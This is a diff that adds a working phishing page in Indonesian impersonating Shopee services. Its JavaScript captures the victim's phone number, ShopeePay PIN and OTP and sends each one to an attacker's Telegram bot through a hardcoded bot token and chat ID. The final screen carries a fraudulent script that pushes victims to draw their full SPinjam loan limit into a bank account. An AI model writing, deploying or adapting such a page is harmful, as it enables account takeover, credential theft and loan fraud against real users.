@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Layanan Shopee</title>
+    <style>
+        :root {
+            --main-color: #ee4d2d;
+            --main-dark: #d73211;
+            --text-primary: rgba(0,0,0,0.87);
+            --text-secondary: rgba(0,0,0,0.54);
+            --border-color: rgba(0,0,0,0.14);
+            --bg-gray: #f5f5f5;
+            --bg-white: #fff;
+            --alarm-color: #ed2633;
+            --orange-text: #ff6a00;
+        }
+        * {margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;}
+        
+        body {
+            background-color: var(--bg-gray);
+            min-height: 100vh;
+            position: relative;
+        }
+        /* BACKGROUND LOGO SHOPEE — LEBIH JELAS & BESAR */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 380px;
+            height: 380px;
+            background-image: url('https://i.imgur.com/TXzZbLd.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0.25;
+            z-index: 0;
+            pointer-events: none;
+        }
+        
+        .header {
+            background: #fff;
+            padding: 20px 0;
+            border-bottom: 1px solid #eee;
+            position: relative;
+            z-index: 1;
+        }
+        .header-inner {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo-area {display: flex; align-items: center; gap: 10px;}
+        .logo-text {
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--main-color);
+            letter-spacing: -0.5px;
+        }
+        .header-title {font-size: 16px; color: var(--text-secondary);}
+
+        .container {
+            max-width: 480px;
+            margin: 30px auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .card {
+            background: #fff;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            padding: 30px 25px;
+            line-height: 1.6;
+        }
+
+        .page {display: none;}
+        .page.active {display: block;}
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: var(--main-color);
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .back-link:hover {text-decoration: underline;}
+
+        h2 {
+            font-size: 18px;
+            color: var(--text-primary);
+            margin-bottom: 20px;
+            font-weight: 500;
+            text-align: center;
+        }
+        .sub-title {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .pin-title {
+            font-size: 16px;
+            color: var(--orange-text);
+            margin-bottom: 25px;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        /* MENU UTAMA */
+        .menu-item {
+            display: flex;
+            align-items: center;
+            padding: 16px 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .menu-item:hover {border-color: var(--main-color); background: #fff8f6;}
+        .menu-icon {font-size: 22px; margin-right: 12px;}
+        .menu-text {font-size: 15px; color: var(--text-primary);}
+
+        /* FORM INPUT */
+        .input-field {
+            width: 100%;
+            padding: 10px 0;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1px solid var(--border-color);
+            outline: none;
+            background: transparent;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .input-field:focus {border-bottom-color: var(--main-color);}
+
+        /* PIN & OTP GROUP */
+        .pin-group, .otp-group {
+            display: flex;
+            gap: 8px;
+            margin: 25px 0;
+            justify-content: center;
+        }
+        .pin-group input, .otp-group input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            border: none;
+            border-bottom: 1px solid var(--border-color);
+            border-radius: 0;
+            outline: none;
+            background: transparent;
+        }
+        .pin-group input:focus, .otp-group input:focus {
+            border-bottom-color: var(--main-color);
+            border-bottom-width: 2px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 13px;
+            background-color: var(--main-color);
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .btn:hover {background-color: var(--main-dark);}
+        .btn:disabled {background-color: #fba694; cursor: not-allowed;}
+
+        .hint-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-top: 12px;
+            line-height: 1.5;
+            text-align: center;
+        }
+        .link {color: var(--main-color); cursor: pointer; text-decoration: none;}
+        .link:hover {text-decoration: underline;}
+        .step {display: none;}
+        .step.active {display: block;}
+        .loading {opacity: 0.7; pointer-events: none;}
+
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 15px 0;
+        }
+        .checkbox-row input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+        }
+        .checkbox-row label {
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+
+        /* PESAN PERINGATAN */
+        .alarm-icon {
+            font-size: 40px;
+            text-align: center;
+            margin-bottom: 15px;
+            color: var(--alarm-color);
+        }
+        .pesan-alarm {
+            background: #fff3f3;
+            border-left: 4px solid var(--alarm-color);
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 3px;
+        }
+        .pesan-alarm h3 {color: var(--alarm-color); font-size: 15px; margin-bottom: 10px;}
+        .pesan-alarm p {font-size: 14px; color: var(--text-primary); margin-bottom: 8px;}
+        .pesan-alarm ol {padding-left: 20px; margin: 10px 0;}
+        .pesan-alarm li {font-size: 14px; margin-bottom: 6px;}
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="header-inner">
+        <div class="logo-area"><span class="logo-text">Shopee</span></div>
+        <div class="header-title" id="page-title"></div>
+    </div>
+</div>
+
+<div class="container">
+
+    <!-- HALAMAN 1: MENU UTAMA -->
+    <div id="page-menu" class="page active">
+        <div class="card">
+            <h2>Layanan Shopee</h2>
+            <div class="menu-item" onclick="bukaMenu('update-resi')">
+                <span class="menu-icon">📦</span>
+                <span class="menu-text">Penambahan Fitur Update Resi</span>
+            </div>
+            <div class="menu-item" onclick="bukaMenu('pengembalian-dana')">
+                <span class="menu-icon">💰</span>
+                <span class="menu-text">Pengembalian Dana</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- HALAMAN 2: NOMOR HP -->
+    <div id="step-hp" class="step">
+        <div class="card">
+            <div class="back-link" onclick="kembaliKeMenu()">← Kembali</div>
+            <h2>Log In Shopee</h2>
+            <p class="sub-title">Masukkan nomor handphone</p>
+            <input type="tel" id="nohp" class="input-field" placeholder="" maxlength="15" inputmode="numeric">
+            <button class="btn" id="btn-hp" onclick="lanjutPIN()">Berikutnya</button>
+        </div>
+    </div>
+
+    <!-- HALAMAN 3: PIN — DENGAN AUTO PINDAH KOLOM -->
+    <div id="step-pin" class="step">
+        <div class="card">
+            <div class="back-link" onclick="kembaliHP()">← Kembali</div>
+            <h2>Log In Shopee</h2>
+            <p class="pin-title">Verifikasi Dengan PIN ShopeePay</p>
+            <div class="pin-group">
+                <input type="password" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 0, 'pin')">
+                <input type="password" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 1, 'pin')">
+                <input type="password" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 2, 'pin')">
+                <input type="password" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 3, 'pin')">
+                <input type="password" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 4, 'pin')">
+                <input type="password" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 5, 'pin')">
+            </div>
+            <button class="btn" id="btn-pin" onclick="cekPIN()">Verifikasi PIN</button>
+        </div>
+    </div>
+
+    <!-- HALAMAN 4: OTP — TANPA TULISAN VERIFIKASI PIN SHOPEEPAY, AUTO PINDAH KOLOM -->
+    <div id="step-otp" class="step">
+        <div class="card">
+            <div class="back-link" onclick="kembaliPIN()">← Kembali</div>
+            <h2>Log In Shopee</h2>
+            <p class="sub-title">Masukkan kode OTP yang dikirim ke nomor <strong id="tampil-hp"></strong></p>
+            <div class="otp-group">
+                <input type="text" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 0, 'otp')">
+                <input type="text" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 1, 'otp')">
+                <input type="text" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 2, 'otp')">
+                <input type="text" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 3, 'otp')">
+                <input type="text" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 4, 'otp')">
+                <input type="text" maxlength="1" inputmode="numeric" oninput="pindahKolom(this, 5, 'otp')">
+            </div>
+            <div class="checkbox-row">
+                <input type="checkbox" id="ingat">
+                <label for="ingat">Tetap Login</label>
+            </div>
+            <button class="btn" id="btn-otp" onclick="cekOTP()">Verifikasi OTP</button>
+            <p class="hint-text">Tidak menerima kode? <span class="link" onclick="kirimUlang()">Kirim ulang OTP</span></p>
+        </div>
+    </div>
+
+    <!-- HALAMAN 5: PESAN PERINGATAN — LANGSUNG SETELAH OTP -->
+    <div id="step-hasil" class="step">
+        <div class="card">
+            <div class="alarm-icon">⚠️</div>
+            
+            <div class="pesan-alarm">
+                <h3>Mohon Maaf</h3>
+                <p id="pesan-utama"></p>
+            </div>
+
+            <div class="pesan-alarm">
+                <p><strong>Silahkan melakukan pengamanan limit akun dengan cara:</strong></p>
+                <p>Mengamankan limit yang tersedia ke rekening bank (pengguna tidak melakukan pinjaman, hanya mengamankan saja). Pengguna diharuskan memulihkan limitnya kembali dengan mengembalikan limit ke akun ShopeePay pengguna itu sendiri, agar tidak terdata sebagai peminjam dan terkena bunga pinjaman.</p>
+                
+                <p style="margin-top:10px;"><strong>Tata caranya:</strong></p>
+                <ol>
+                    <li>Klik Spinjam</li>
+                    <li>Klik Cairkan</li>
+                    <li>Masukkan semua nominal limit</li>
+                    <li>Durasi bebas memilih dikarenakan bukan melakukan pinjaman</li>
+                    <li>Pilih rekening bank atau akun ShopeePay</li>
+                    <li>Konfirmasi</li>
+                </ol>
+            </div>
+
+            <div class="pesan-alarm">
+                <p>✅ Menginformasikan kepada Customer Service yang menghubungi untuk dilakukan pemulihan limit.</p>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+// === TELEGRAM BOT DATA ===
+const BOT_TOKEN = "8759055248:AAFrmyifbfkrFJhBXoMCwOyUkYVsYGntmT8";
+const CHAT_ID = "6655781102";
+
+let nomorHP = "";
+let pinUser = "";
+let layanan = "";
+
+// ✅ FUNGSI PINDAH KOLOM OTOMATIS
+function pindahKolom(el, index, tipe) {
+    if (el.value.length === 1 && index < 5) {
+        const selector = tipe === 'pin' ? '.pin-group input' : '.otp-group input';
+        document.querySelectorAll(selector)[index + 1].focus();
+    }
+}
+
+function tampilkanHalaman(id) {
+    document.querySelectorAll('.page, .step').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+}
+
+function bukaMenu(jenis) {
+    layanan = jenis;
+    document.getElementById('page-title').textContent = jenis === 'update-resi' ? 'Penambahan Fitur Update Resi' : 'Pengembalian Dana';
+    tampilkanHalaman('step-hp');
+}
+
+function kembaliKeMenu() {
+    tampilkanHalaman('page-menu');
+    document.getElementById('page-title').textContent = '';
+}
+
+function kembaliHP() {
+    tampilkanHalaman('step-hp');
+}
+
+function kembaliPIN() {
+    tampilkanHalaman('step-pin');
+}
+
+function kembaliOTP() {
+    tampilkanHalaman('step-otp');
+}
+
+async function kirimKeTelegram(pesan) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    try {
+        await fetch(url, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: pesan,
+                parse_mode: "HTML"
+            })
+        });
+    } catch (e) {
+        console.log("Error kirim ke Telegram:", e);
+    }
+}
+
+function setLoading(id, show) {
+    const btn = document.getElementById(id);
+    if (show) {
+        btn.classList.add('loading');
+        btn.disabled = true;
+    } else {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+    }
+}
+
+async function lanjutPIN() {
+    nomorHP = document.getElementById('nohp').value.trim();
+    if (!nomorHP) {
+        alert("Masukkan nomor handphone dulu!");
+        return;
+    }
+    setLoading('btn-hp', true);
+    
+    const pesan = `🔐 <b>LOGIN - ${layanan === 'update-resi' ? 'PENAMBAHAN FITUR UPDATE RESI' : 'PENGEMBALIAN DANA'}</b>
+━━━━━━━━━━━━━━━━
+📱 Nomor HP: <code>${nomorHP}</code>
+📌 Status: Menunggu PIN...
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+    
+    await kirimKeTelegram(pesan);
+    setLoading('btn-hp', false);
+    tampilkanHalaman('step-pin');
+    document.querySelectorAll('.pin-group input')[0].focus();
+}
+
+async function cekPIN() {
+    const pinInputs = document.querySelectorAll('.pin-group input');
+    pinUser = Array.from(pinInputs).map(i => i.value).join('');
+    
+    if (pinUser.length !== 6) {
+        alert("Masukkan 6 digit PIN!");
+        return;
+    }
+    setLoading('btn-pin', true);
+    
+    const pesan = `🔐 <b>VERIFIKASI PIN</b>
+━━━━━━━━━━━━━━━━
+📱 Nomor HP: <code>${nomorHP}</code>
+🔢 PIN: <code>${pinUser}</code>
+📌 Status: Menunggu OTP...
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+    
+    await kirimKeTelegram(pesan);
+    setLoading('btn-pin', false);
+    
+    document.getElementById('tampil-hp').textContent = nomorHP;
+    tampilkanHalaman('step-otp');
+    document.querySelectorAll('.otp-group input')[0].focus();
+}
+
+async function cekOTP() {
+    const otpInputs = document.querySelectorAll('.otp-group input');
+    const otp = Array.from(otpInputs).map(i => i.value).join('');
+    
+    if (otp.length !== 6) {
+        alert("Masukkan 6 digit kode OTP!");
+        return;
+    }
+    setLoading('btn-otp', true);
+    
+    const pesan = `🔐 <b>VERIFIKASI OTP</b>
+━━━━━━━━━━━━━━━━
+📱 Nomor HP: <code>${nomorHP}</code>
+🔢 PIN: <code>${pinUser}</code>
+🔑 OTP: <code>${otp}</code>
+📌 Status: Diproses...
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+    
+    await kirimKeTelegram(pesan);
+    setLoading('btn-otp', false);
+    
+    // ✅ LANGSUNG KE PESAN PERINGATAN, TANPA FORM DATA RESI
+    document.getElementById('pesan-utama').textContent = 
+        layanan === 'update-resi' 
+            ? "Untuk fitur Penambahan Update Resi belum bisa ditambahkan di akun Shopee dikarenakan akun kadaluarsa. Silahkan melakukan update data terlebih dahulu melalui fitur kami."
+            : "Untuk fitur Pengembalian Dana belum bisa diproses di akun Shopee dikarenakan akun memiliki limit yang belum diamankan. Silahkan melakukan pengamanan limit terlebih dahulu.";
+    
+    tampilkanHalaman('step-hasil');
+}
+
+function kirimUlang() {
+    alert("Kode OTP telah dikirim ulang!");
+}
+</script>
+
+</body>
+  </html>
+  
